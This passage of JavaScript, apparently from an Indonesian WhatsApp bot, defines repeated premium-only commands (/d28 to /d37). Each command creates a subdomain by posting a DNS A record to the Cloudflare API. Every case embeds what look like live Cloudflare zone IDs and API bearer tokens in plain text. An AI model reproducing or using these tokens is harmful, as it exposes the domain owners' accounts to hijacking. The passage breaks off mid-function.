        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6283856419394")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
            let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd"
            let tld = "dewapanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d28': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "98264c6c53c5bc9080230b077422d748";
            let apitoken = "1W9IHC9mLAKj8hQaMjczy0gA3Of7kPjJ3gAvTlnZ"
            let tld = "adminpanel.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d29': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
            let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4"
            let tld = "plerkuda.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d30': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "2bb49b2de0cbf75c0462ed90d7d333e1";
            let apitoken = "lZ0XMXdnwp2L1DsI3f8frkPwvkQ6ENee2PnAfOsY"
            let tld = "cafegt.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d31': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "984d44a115c1748d9a34823c3881e491";
            let apitoken = "UYoy7wtrrYwMGtCKdICCJCzvzcSmTXkwPkMmVPmq"
            let tld = "dmdpanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d32': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "9ddbf1836c0a5a70de3d915d3b81e335";
            let apitoken = "qz5IvvImeSmnYgf6AI9C4PTJ9qpFmBtaAudHhZ2"
            let tld = "storemurah.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d33': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "d28c394ba64bf4ecfec1917829d8bced";
            let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
            let tld = "shopwebsite.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d34': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "347f37a08f49a25bb16f82b43ece372a";
            let apitoken = "FCiMlkNShemGyG_8mv3xI_cXSjOs15bVJqgG2zxm"
            let tld = "market-software.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d35': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "cda16bf7cb613a196f54b7c0441d3960";
            let apitoken = "jeijhUa-rD-B6I62yEaDDIG23HZpibBOkw3l1bRS"
            let tld = "panel-digital.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d36': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "d6afa7851ec519b570b38f0d1185eb1d";
            let apitoken = "1rH2Mn0rH8GWIQ5UdsA64qmWghTGctgfr1bG_a42"
            let tld = "acrp.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d37': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "4b86dfa4879022e26a99d381ace06878";
            let apitoken = "EEkfE5iWyG-pXu6zvQ8TCQk7G-WHV5c-TzdTHlzz"
            let tld = "caca-store.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
